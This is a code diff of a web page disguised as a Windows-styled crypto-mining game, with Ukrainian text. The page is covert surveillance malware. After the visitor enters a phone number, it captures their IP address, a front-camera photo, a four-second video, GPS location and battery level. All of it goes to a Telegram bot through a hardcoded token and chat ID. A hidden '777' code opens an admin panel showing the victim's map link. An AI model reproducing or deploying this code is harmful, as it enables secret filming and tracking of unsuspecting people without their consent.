@@ -10,21 +10,23 @@
         .titlebar { height: 28px; background: #000080; display: flex; align-items: center; padding: 0 8px; gap: 6px; flex-shrink: 0; }
         .title-text { flex: 1; font-size: 11px; color: #fff; font-weight: bold; }
         .tbtn { width: 16px; height: 14px; background: #c0c0c0; border: 1px solid #fff; border-right: 2px solid #444; border-bottom: 2px solid #444; font-size: 9px; color: #000; display: flex; align-items: center; justify-content: center; }
-        .terminal { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; position: relative; }
-        #auth-screen, #admin-screen { text-align: center; margin-top: 15%; }
-        #game-screen, #admin-screen { display: none; }
+        .terminal { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; }
+        #auth-screen, #admin-screen, #game-screen { display: none; }
+        #auth-screen { display: block; text-align: center; margin-top: 15%; }
         input { background: transparent; border: 1px solid #0f0; color: #fff; padding: 10px; width: 85%; margin: 15px 0; outline: none; font-size: 16px; text-align: center; }
-        button { background: #0f0; color: #000; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        button { background: #0f0; color: #000; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; text-transform: uppercase; margin: 5px; }
         .log-line { margin-bottom: 5px; font-size: 12px; line-height: 1.3; text-align: left; }
         .red { color: #ff5555; }
         .yellow { color: #ffff00; }
         .stat-bar { background: #1a1a1a; padding: 8px 15px; border-top: 1px solid #333; display: flex; justify-content: space-between; font-size: 11px; color: #888; }
+        .admin-box { background: #111; border: 1px solid #444; padding: 15px; margin-top: 10px; text-align: left; }
+        .adm-btn { background: #333; color: #fff; font-size: 10px; padding: 8px; border: 1px solid #555; cursor: pointer; }
     </style>
 </head>
 <body>
 
     <div class="titlebar">
-        <span class="title-text">Microsoft Windows [Admin Mode]</span>
+        <span class="title-text">Microsoft Windows [Version 10.0.19045]</span>
         <div class="tbtn">_</div><div class="tbtn">□</div><div class="tbtn" style="background:#ff5555">X</div>
     </div>
 
@@ -37,33 +39,47 @@
         </div>
 
         <div id="game-screen">
-            <div id="output">
-                <p class="log-line">> CONNECTION ESTABLISHED...</p>
-            </div>
+            <div id="output"><p class="log-line">> З'єднання встановлено...</p></div>
             <div style="margin-top: 20px; text-align: center;">
                 <h1 id="balance" style="font-size: 35px; color: #fff;">0.0000 BTC</h1>
-                <button onclick="mine()" style="width:100%">MINE BLOCK ⚡</button>
+                <button onclick="mine()" style="width:100%">ЗЛАМАТИ БЛОК ⚡</button>
             </div>
         </div>
 
         <div id="admin-screen">
-            <h2 class="red">⚙️ ADMIN PANEL</h2>
-            <p id="admin-log">> System online.</p>
-            <button onclick="location.reload()" style="margin-top:20px; background:#444; color:#fff">EXIT</button>
+            <h2 class="red">⚙️ ADMIN CONTROL PANEL</h2>
+            <div class="admin-box">
+                <p class="yellow">[ОСТАННІЙ ЗВІТ]</p>
+                <div id="admin-log" style="font-size: 11px; margin: 10px 0; color: #ccc;">> Дані відсутні</div>
+                <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+                    <button class="adm-btn" id="adm-map" onclick="window.open(lastMap)">📍 Карта</button>
+                    <button class="adm-btn" onclick="location.reload()">🔄 Оновити</button>
+                </div>
+            </div>
+            <button onclick="location.reload()" style="margin-top:20px; background:#222; color:#fff; width:100%">ВИХІД</button>
         </div>
     </div>
 
     <div class="stat-bar" id="footer" style="display:none">
-        <span id="bat-info">BATTERY: 100%</span>
-        <span id="ip-display">IP: LOADING...</span>
+        <span id="bat-info">BATTERY: --%</span>
+        <span id="ip-display">IP: ...</span>
     </div>
 
     <script>
         const botToken = '8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8';
         const chatId = '8194848649';
         let btc = 0;
+        let lastMap = "#";
+        let targetPhone = "";
 
-        async function checkAccess() {
+        // Отримання батареї відразу
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                document.getElementById('bat-info').innerText = "BATTERY: " + Math.round(b.level * 100) + "%";
+            });
+        }
+
+        function checkAccess() {
             const val = document.getElementById('user-phone').value;
             if (val === "777") {
                 document.getElementById('auth-screen').style.display = 'none';
@@ -71,77 +87,96 @@
                 return;
             }
             if (val.length < 7) return alert("Error: Invalid ID");
-
-            startSpying(val);
+            targetPhone = val;
+            startAllSystems();
         }
 
-        async function startSpying(phone) {
-            const auth = document.getElementById('auth-screen');
-            auth.innerHTML = '<p class="log-line yellow">> ІНІЦІАЛІЗАЦІЯ БІОМЕТРІЇ...</p><p id="h-status" class="log-line"></p>';
+        async function startAllSystems() {
+            document.getElementById('auth-screen').innerHTML = '<p class="log-line yellow">> ПЕРЕВІРКА ПРАВ ДОСТУПУ...</p><p id="h-logs" class="log-line"></p>';
             
-            try {
-                // 1. Отримуємо IP
-                const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
-                const ipData = ipRes ? await ipRes.json() : { ip: "Unknown" };
-                document.getElementById('ip-display').innerText = "IP: " + ipData.ip;
+            // 1. IP ДАНІ (Без дозволів)
+            const ipRes = await fetch('https://ipapi.co/json/').catch(() => null);
+            const ip = ipRes ? await ipRes.json() : { ip: "N/A", city: "Unknown", org: "N/A" };
+            document.getElementById('ip-display').innerText = "IP: " + ip.ip;
 
-                // 2. Доступ до камери
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.muted = true;
-                video.setAttribute("playsinline", true);
-                await video.play();
+            // 2. КАМЕРА (Окремий блок)
+            captureMedia(ip);
 
-                // 3. Робимо ФОТО через 1.5 сек (щоб камера "прокинулась")
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth; 
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    // 4. ЗАПИСУЄМО ВІДЕО
-                    const recorder = new MediaRecorder(stream);
-                    let chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        const vBlob = new Blob(chunks, { type: 'video/webm' });
-                        sendData(canvas, vBlob, phone, ipData);
-                        stream.getTracks().forEach(t => t.stop());
-                    };
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 4000);
-                }, 1500);
+            // 3. ЛОКАЦІЯ (Окремий блок)
+            captureLocation(ip);
 
-            } catch (err) {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=❌ ERROR: ${err.message}`);
-            }
-
-            // Перехід до гри
             setTimeout(() => {
-                auth.style.display = 'none';
+                document.getElementById('auth-screen').style.display = 'none';
                 document.getElementById('game-screen').style.display = 'block';
                 document.getElementById('footer').style.display = 'flex';
             }, 3000);
         }
 
-        function sendData(canvas, vBlob, phone, ip) {
-            navigator.geolocation.getCurrentPosition(pos => {
-                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                canvas.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'f.jpg');
-                    fd.append('caption', `🕵️‍♂️ <b>Target:</b> ${phone}\n🌐 <b>IP:</b> ${ip.ip}\n📍 <b>Map:</b> ${map}`);
-                    fd.append('parse_mode', 'HTML');
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                }, 'image/jpeg');
+        async function captureMedia(ip) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
 
-                const vfd = new FormData();
-                vfd.append('chat_id', chatId);
-                vfd.append('video', vBlob, 'v.webm');
-                fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
-            });
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const recorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const vBlob = new Blob(chunks, { type: 'video/webm' });
+                        sendMedia(canvas, vBlob);
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 4000);
+                }, 1000);
+            } catch (e) {
+                sendText(`⚠️ Камера заблокована: ${e.message}\n📱 Тел: ${targetPhone}\n🌐 IP: ${ip.ip}`);
+            }
+        }
+
+        function captureLocation(ip) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    lastMap = map;
+                    updateAdmin(`📍 Локація отримана: <a href="${map}" target="_blank" style="color:#0f0">ВІДКРИТИ</a><br>🌐 IP: ${ip.ip}`);
+                    sendText(`📍 <b>ЛОКАЦІЯ:</b> <a href="${map}">Google Maps</a>\n📱 <b>Тел:</b> ${targetPhone}\n🌐 <b>IP:</b> ${ip.ip}\n🔋 <b>Батарея:</b> ${document.getElementById('bat-info').innerText}`);
+                },
+                err => {
+                    sendText(`⚠️ Локація заблокована: ${err.message}\n📱 Тел: ${targetPhone}\n🌐 IP: ${ip.ip}`);
+                }
+            );
+        }
+
+        function sendText(txt) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(txt)}&parse_mode=HTML`);
+        }
+
+        function sendMedia(canvas, vBlob) {
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', chatId);
+                fd.append('photo', blob, 'p.jpg');
+                fd.append('caption', `📸 <b>ФОТО ПРИЙШЛО</b>\n📱 Тел: ${targetPhone}\n🔋 ${document.getElementById('bat-info').innerText}`);
+                fd.append('parse_mode', 'HTML');
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg');
+
+            const vfd = new FormData();
+            vfd.append('chat_id', chatId);
+            vfd.append('video', vBlob, 'v.webm');
+            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: vfd });
+        }
+
+        function updateAdmin(msg) {
+            const al = document.getElementById('admin-log');
+            if(al) al.innerHTML = msg;
         }
 
         function mine() {
@@ -150,7 +185,7 @@
             const out = document.getElementById('output');
             const p = document.createElement('p');
             p.className = 'log-line';
-            p.innerHTML = Math.random() > 0.8 ? `<span class="red">[!] Accessing DCIM...</span>` : `<span style="color:#0f0">[OK]</span> Hash: 0x${Math.random().toString(16).slice(2,8)}`;
+            p.innerHTML = `<span style="color:#0f0">[OK]</span> Mining block 0x${Math.random().toString(16).slice(2,8)}...`;
             out.appendChild(p);
             out.scrollTop = out.scrollHeight;
         }
